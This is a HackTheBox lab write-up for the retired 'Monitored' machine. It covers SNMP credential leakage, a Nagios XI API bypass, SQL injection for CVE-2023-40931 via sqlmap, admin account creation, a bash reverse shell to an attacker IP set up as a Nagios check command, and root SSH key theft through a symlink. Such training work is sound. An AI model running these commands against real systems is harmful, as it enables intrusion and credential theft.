# Monitored — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Monitored |
| OS | Linux |
| Difficulty | Medium |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.230.96` |
| Domain | `nagios.monitored.htb` |
| Tools Used | Nmap, snmpwalk, curl, Firefox, Burp Suite, sqlmap, nc |
| CVEs | CVE-2023-40931 (Nagios XI SQLi in `banner_message-ajaxhelper.php`) |
| Date | September 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Step 1 — Reconnaissance](#step-1--reconnaissance)
- [Step 2 — UDP Scan](#step-2--udp-scan)
- [Step 3 — SNMP Credential Leak via snmpwalk](#step-3--snmp-credential-leak-via-snmpwalk)
- [Step 4 — Bypass Disabled Account via Nagios API](#step-4--bypass-disabled-account-via-nagios-api)
- [Step 5 — SQL Injection — CVE-2023-40931](#step-5--sql-injection--cve-2023-40931)
- [Step 6 — Create Admin Account via Nagios API](#step-6--create-admin-account-via-nagios-api)
- [Step 7 — Remote Code Execution via Nagios Command Injection](#step-7--remote-code-execution-via-nagios-command-injection)
- [Step 8 — User Flag](#step-8--user-flag)
- [Step 9 — Privilege Enumeration](#step-9--privilege-enumeration)
- [Step 10 — Analyse getprofile.sh](#step-10--analyse-getprofilesh)
- [Step 11 — Privilege Escalation — Symlink Attack via getprofile.sh](#step-11--privilege-escalation--symlink-attack-via-getprofilesh)
- [Step 12 — SSH as root — Root Flag](#step-12--ssh-as-root--root-flag)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

```
SNMP UDP 161 (community: public) -> svc:XjH7VCehowpR1xZB credential leak
        ↓
Nagios API /authenticate -> disabled account bypass -> auth token issued
        ↓
Nagios XI 5.11.0 dashboard access via ?token= URL parameter
        ↓
CVE-2023-40931 SQLi (banner_message-ajaxhelper.php) -> nagiosadmin API key
        ↓
Admin account creation via API key -> full dashboard access as tcg
        ↓
Configure -> check command ashell (bash reverse shell) -> Run check command
        ↓
nagios shell on 10.129.230.96
        ↓
sudo -l -> getprofile.sh (NOPASSWD) -> phpmailer.log symlink -> /root/.ssh/id_rsa
        ↓
Root SSH private key extracted -> SSH as root -> root flag
```

---

## Step 1 — Reconnaissance

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate=1000 -T4 10.129.230.96
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  tcpwrapped
```

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p22,80,389,443,5667 -sC -sV 10.129.230.96
```

```
80/tcp  → Apache redirects to https://nagios.monitored.htb/
443/tcp → Nagios XI (Apache 2.4.56 Debian)
```

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c 'echo "10.129.230.96 nagios.monitored.htb" >> /etc/hosts'
```

---

## Step 2 — UDP Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sU --top-ports 10 -sV 10.129.230.96
```

```
161/udp open  snmp  SNMPv1 server; net-snmp SNMPv3 server (public)
```

---

## Step 3 — SNMP Credential Leak via snmpwalk

```bash
Hackerpatel007_1@htb[/htb]$ snmpwalk -v 2c -c public nagios.monitored.htb 1.3.6.1.2.1.25.4.2.1.5
```

```
iso.3.6.1.2.1.25.4.2.1.5.519 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```

**Credentials:** `svc:XjH7VCehowpR1xZB`

---

## Step 4 — Bypass Disabled Account via Nagios API

Web login rejected (account disabled). API does not enforce the same check:

```bash
Hackerpatel007_1@htb[/htb]$ curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' \
  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```

```json
{"auth_token":"0f04a03bdc42d65e2faa0af96fd3b15a","valid_min":5}
```

Dashboard access via:

```
https://nagios.monitored.htb/nagiosxi/index.php?token=0f04a03bdc42d65e2faa0af96fd3b15a
```

Nagios XI **5.11.0** confirmed.

---

## Step 5 — SQL Injection — CVE-2023-40931

Banner acknowledgment POST: `action=acknowledge_banner_message&id=3*` returns SQL error — injection confirmed.

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" \
  --batch -p id --cookie="nagiosxi=<session>" -D nagiosxi -T xi_users --dump --threads=10
```

```
nagiosadmin | api_key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```

---

## Step 6 — Create Admin Account via Nagios API

```bash
Hackerpatel007_1@htb[/htb]$ curl -k --silent \
  "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \
  -d "username=tcg&password=YoullNeverGuessThis&name=TCG&email=tcg@localhost&auth_level=admin"
```

```json
{"success":"User account tcg was added successfully!"}
```

---

## Step 7 — Remote Code Execution via Nagios Command Injection

Navigate: **Configure → Core Config Manager → Commands → Add New**

| Field | Value |
|-------|-------|
| Command Name | `ashell` |
| Command Line | `/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'` |

Save → Apply Configuration → start listener → **Monitoring → Hosts → localhost → Run check command**

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvvp 4444
nagios@monitored:~$
```

---

## Step 8 — User Flag

```bash
nagios@monitored:~$ cat /home/nagios/user.txt
52e9eeb7cfb90df00fd948d8bfdf9110
```

---

## Step 9 — Privilege Enumeration

```bash
nagios@monitored:~$ sudo -l
(root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
```

---

## Step 10 — Analyse getprofile.sh

Relevant excerpt:

```bash
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "$PROFILE_FOLDER/phpmailer.log"
fi
```

`-f` follows symlinks. The `tmp/` directory is writable by `nagios`.

```bash
nagios@monitored:~$ ls -la /usr/local/nagiosxi/tmp/
drwxrwxr-x 2 nagios nagios 4096 Nov 11  2023 .
```

---

## Step 11 — Privilege Escalation — Symlink Attack via getprofile.sh

```bash
nagios@monitored:~$ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
nagios@monitored:~$ cd /tmp && unzip profile.zip
nagios@monitored:/tmp$ cat profile-*/phpmailer.log
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

---

## Step 12 — SSH as root — Root Flag

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
Hackerpatel007_1@htb[/htb]$ ssh root@nagios.monitored.htb -i id_rsa
root@monitored:~# cat /root/root.txt
293d53f4eefe3b27c6541015cc3706e9
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `52e9eeb7cfb90df00fd948d8bfdf9110` |
| Root Flag | `293d53f4eefe3b27c6541015cc3706e9` |

---

## Lessons Learned

1. Always run a UDP scan — SNMP on port 161 exposes every running process and its full command-line arguments including passwords.
2. API endpoints often do not enforce the same restrictions as the web UI — the web login rejected the disabled account but the API issued a valid token anyway.
3. CVE-2023-40931 — authenticated SQLi in a low-privilege endpoint gave read access to admin API keys.
4. `[ -f /path ]` follows symlinks. Scripts that `tail` or `cat` files using this check are symlink candidates when the directory is writable.
5. `PermitRootLogin prohibit-password` + a readable root SSH key = full compromise.

---

## Full Attack Chain Reference

```
nmap → SSH (22), HTTP (80), LDAP (389), HTTPS Nagios XI (443), NRPE (5667)
nmap -sU → SNMP UDP 161 (public)
snmpwalk → svc:XjH7VCehowpR1xZB
Web login rejected (disabled) → API /authenticate → token
Dashboard ?token= → Nagios XI 5.11.0
Burp POST banner_message id=3* → SQL error
sqlmap → xi_users → nagiosadmin API key
POST /api/v1/system/user?apikey=<key> → admin account tcg
Configure → ashell command → nc -lvvp 4444 → Run check → nagios shell
cat /home/nagios/user.txt: 52e9eeb7cfb90df00fd948d8bfdf9110
sudo -l → getprofile.sh NOPASSWD
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
sudo getprofile.sh 1 → id_rsa in profile.zip
chmod 600 id_rsa && ssh root@nagios.monitored.htb -i id_rsa
cat /root/root.txt: 293d53f4eefe3b27c6541015cc3706e9
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -p- --min-rate=1000 -T4 <IP>` | Full TCP port scan |
| `sudo nmap -sU --top-ports 10 -sV <IP>` | UDP scan for SNMP |
| `snmpwalk -v 2c -c public <host> 1.3.6.1.2.1.25.4.2.1.5` | Enumerate SNMP process arguments |
| `curl -XPOST -k -L '.../api/v1/authenticate' -d 'username=svc&password=...'` | Obtain API token for disabled account |
| `sqlmap -u '...id=3' --batch -p id --cookie='...' -D nagiosxi -T xi_users --dump` | Dump xi_users for API keys |
| `curl -k '...user?apikey=<key>' -d 'username=tcg&auth_level=admin'` | Create admin account |
| `ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log` | Symlink for getprofile.sh |
| `sudo getprofile.sh 1 && unzip /tmp/profile.zip` | Extract root SSH key |
| `chmod 600 id_rsa && ssh root@<host> -i id_rsa` | SSH as root |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|---------|
| Network Service Discovery | T1046 | UDP scan discovered SNMP on port 161 |
| Unsecured Credentials in Files | T1552.001 | SNMP process table leaked `svc` credentials |
| Exploit Public-Facing Application | T1190 | CVE-2023-40931 SQLi in Nagios XI banner endpoint |
| Valid Accounts | T1078.003 | Disabled account API bypass; admin account via stolen API key |
| Unix Shell | T1059.004 | Bash reverse shell as Nagios check command |
| Exploitation for Privilege Escalation | T1068 | Symlink attack via sudo getprofile.sh |
| Private Keys | T1552.004 | Root SSH private key extracted from symlink |
| Remote Services SSH | T1021.004 | Root SSH login using extracted key |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
